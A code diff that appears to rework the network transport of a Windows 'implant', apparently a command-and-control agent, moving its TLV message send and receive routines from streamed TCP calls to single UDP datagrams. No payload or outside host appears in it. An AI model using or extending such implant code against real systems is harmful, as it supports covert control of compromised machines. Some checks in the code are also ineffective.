@@ -19,25 +19,22 @@
  */
 static BOOL SendAll(SOCKET sock, CONST CHAR* buf, INT len)
 {
-	INT sentTotal = 0;
+	struct sockaddr_in sa = GetSockAddr();
 
 	ASSERT(sock != INVALID_SOCKET);
 	ASSERT(buf != NULL);
 
-	while (sentTotal < len)
+	INT sent = sendto(
+		sock,
+		buf,
+		len,
+		SOCKET_SEND_FLAGS,
+		(struct sockaddr*)&sa,
+		sizeof(struct sockaddr)
+	);
+	if (sent == SOCKET_ERROR)
 	{
-		INT sent = send(
-			sock,
-			buf + sentTotal,
-			len - sentTotal,
-			SOCKET_SEND_FLAGS
-		);
-		if (sent == SOCKET_ERROR)
-		{
-			return FALSE;
-		}
-
-		sentTotal += sent;
+		return FALSE;
 	}
 
 	return TRUE;
@@ -57,25 +54,21 @@ static BOOL SendAll(SOCKET sock, CONST CHAR* buf, INT len)
  */
 static BOOL RecvAll(SOCKET sock, CHAR* buf, INT len)
 {
-	INT recvTotal = 0;
 
 	ASSERT(sock != INVALID_SOCKET);
 	ASSERT(buf != NULL);
 
-	while (recvTotal < len)
+	INT received = recvfrom(
+		sock,
+		buf,
+		len,
+		SOCKET_RECV_FLAGS,
+		NULL,
+		NULL
+	);
+	if (received <= 0)
 	{
-		INT received = recv(
-			sock,
-			buf + recvTotal,
-			len - recvTotal,
-			SOCKET_RECV_FLAGS
-		);
-		if (received <= 0)
-		{
-			return FALSE;
-		}
-
-		recvTotal += received;
+		return FALSE;
 	}
 
 	return TRUE;
@@ -83,33 +76,27 @@ static BOOL RecvAll(SOCKET sock, CHAR* buf, INT len)
 
 BOOL SendTlvMessage(SOCKET sock, DWORD type, DWORD payloadLength, CONST PBYTE payload)
 {
-	BYTE header[TLV_HEADER_SIZE] = { 0 };
+	PBYTE msg = ImplantHeapAlloc(TLV_HEADER_SIZE + payloadLength);
 
 	ASSERT(sock != INVALID_SOCKET);
 
-	*(DWORD*)(header + TLV_TYPE_FIELD_OFFSET) = type;
-	*(DWORD*)(header + TLV_LENGTH_FIELD_OFFSET) = payloadLength;
+	memcpy(msg + TLV_TYPE_FIELD_OFFSET, &type, sizeof(DWORD));
+	memcpy(msg + TLV_LENGTH_FIELD_OFFSET, &payloadLength, sizeof(DWORD));
+	memcpy(msg + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD), payload, payloadLength);
 
-	if (!SendAll(sock, (CONST CHAR*)header, TLV_HEADER_SIZE))
+	if (!SendAll(sock, (CONST CHAR*)msg, TLV_HEADER_SIZE + payloadLength))
 	{
+		ImplantHeapFree(msg);
 		return FALSE;
 	}
 
-	if (payloadLength > 0 && payload != NULL)
-	{
-		if (!SendAll(sock, (CONST CHAR*)payload, (INT)payloadLength))
-		{
-			return FALSE;
-		}
-	}
-
+	ImplantHeapFree(msg);
 	return TRUE;
 }
 
 BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
 {
-	BYTE header[TLV_HEADER_SIZE] = { 0 };
-
+	PBYTE buff = ImplantHeapAlloc(MAX_MESSAGE_SIZE);
 	ASSERT(sock != INVALID_SOCKET);
 	ASSERT(msg != NULL);
 
@@ -117,16 +104,18 @@ BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
 	msg->length = 0;
 	msg->value = NULL;
 
-	if (!RecvAll(sock, (CHAR*)header, TLV_HEADER_SIZE))
+	if (!RecvAll(sock, (CHAR*)buff, MAX_MESSAGE_SIZE))
 	{
+		ImplantHeapFree(buff);
 		return FALSE;
 	}
 
-	msg->type = *(DWORD*)(header + TLV_TYPE_FIELD_OFFSET);
-	msg->length = *(DWORD*)(header + TLV_LENGTH_FIELD_OFFSET);
+	msg->type = *(DWORD*)(buff + TLV_TYPE_FIELD_OFFSET);
+	msg->length = *(DWORD*)(buff + TLV_LENGTH_FIELD_OFFSET);
 
 	if (msg->length >= MAX_MESSAGE_SIZE)
 	{
+		ImplantHeapFree(buff);
 		return FALSE;
 	}
 
@@ -135,16 +124,23 @@ BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
 		msg->value = (PBYTE)ImplantHeapAlloc((SIZE_T)msg->length);
 		if (msg->value == NULL)
 		{
+			ImplantHeapFree(buff);
 			return FALSE;
 		}
 
-		if (!RecvAll(sock, (CHAR*)msg->value, (INT)msg->length))
+		if (!memcpy(msg->value,
+			buff + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD),
+			msg->length
+			))
 		{
 			ImplantHeapFree(msg->value);
+			ImplantHeapFree(buff);
 			msg->value = NULL;
 			return FALSE;
 		}
 	}
+
+	ImplantHeapFree(buff);
 
 	return TRUE;
 }
